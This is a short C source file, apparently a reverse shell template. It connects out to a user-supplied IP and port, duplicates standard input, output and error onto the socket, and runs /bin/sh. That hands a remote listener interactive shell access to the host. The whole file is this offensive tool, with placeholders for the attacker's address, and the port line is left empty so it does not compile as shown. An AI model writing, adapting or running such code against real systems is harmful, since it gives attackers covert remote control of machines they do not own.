#include <arpa/inet.h>
#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  char *ip = "enter yout ip";//ip 
  int port=;//enter your port 
  // printf("%s\n%d\n", ip, port);
  // create socket :)
  // IPv4 TCP
  int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
  // assign port and ip to socket
  struct sockaddr_in cli_addr;
  cli_addr.sin_family = AF_INET;
  cli_addr.sin_port = htons(port);
  // htons fn->convert to network btye order MSB first :)
  cli_addr.sin_addr.s_addr = inet_addr(ip);
  connect(sock_fd, (struct sockaddr *)&cli_addr,sizeof(cli_addr) );
  // dup -> (duplicate fd) dup stdin,stdout,stderr
  dup2(sock_fd, STDIN_FILENO);
  dup2(sock_fd, STDOUT_FILENO);
  dup2(sock_fd, STDERR_FILENO);
  // call execve to spawn shell
  execve("/bin/sh", NULL, NULL);
}